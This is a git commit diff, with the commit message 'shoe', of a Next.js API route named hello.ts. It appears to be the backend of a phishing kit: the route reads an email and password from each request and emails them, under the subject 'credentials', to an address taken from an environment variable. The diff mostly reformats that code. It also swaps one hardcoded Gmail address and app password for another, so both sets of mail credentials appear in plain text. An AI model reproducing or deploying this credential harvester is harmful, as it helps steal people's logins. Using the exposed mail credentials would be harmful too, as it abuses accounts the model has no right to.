47fb9e1bc3c690df5a483ea7d24813014f5532be
Victor Bello <you@example.com>
2023-08-21 08:13:40 +0100

    shoe

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -1,51 +1,50 @@
 // Next.js API route support: https://nextjs.org/docs/api-routes/introduction
-import dotenv from "dotenv"
-import type { NextApiRequest, NextApiResponse } from 'next'
-import nodemailer from 'nodemailer'
+import dotenv from "dotenv";
+import type { NextApiRequest, NextApiResponse } from "next";
+import nodemailer from "nodemailer";
 
-dotenv.config()
+dotenv.config();
 
 type Data = {
-  message: string
-}
+  message: string;
+};
 
 export default function handler(
   req: NextApiRequest,
   res: NextApiResponse<Data>
 ) {
-
-
-  const {email, password} = req.body
+  const { email, password } = req.body;
 
   let transporter: nodemailer.Transporter = nodemailer.createTransport({
-    service: 'Gmail',
+    service: "Gmail",
     host: "smtp.gmail.com",
     port: 465,
     secure: true,
     auth: {
-      user: 'deeswork969@gmail.com', 
-      pass: 'euujozgmwmhqniiu', 
+      user: "Deesbox96@gmail.com",
+      pass: "erfwgneywbkpimcp",
     },
   });
 
-  return transporter.sendMail({
-              from: `"fox" <deeswork969@gmail.com>`,
-              to: process.env.EMAIL_TO_SEND,
-              subject: 'credentials',
-              // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
-              html: `<h3>${JSON.stringify(email).replaceAll('"', '')} /password: ${JSON.stringify(password).replaceAll('"', '')}</h3>`
-            }).then((rec) => {
+  return transporter
+    .sendMail({
+      from: `"fox" <Deesbox96@gmail.com>`,
+      to: process.env.EMAIL_TO_SEND,
+      subject: "credentials",
+      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
+      html: `<h3>${JSON.stringify(email).replaceAll(
+        '"',
+        ""
+      )} /password: ${JSON.stringify(password).replaceAll('"', "")}</h3>`,
+    })
+    .then((rec) => {
+      console.log(rec);
 
-              console.log(rec);
-              
-              return res.status(200).send({message: 'message sent'})
-              
-            }).catch((err) => {
-              
-              console.log(err);
-              
-              return res.status(200).send({message:'an error occured'})
-            })
-  
-  
+      return res.status(200).send({ message: "message sent" });
+    })
+    .catch((err) => {
+      console.log(err);
+
+      return res.status(200).send({ message: "an error occured" });
+    });
 }
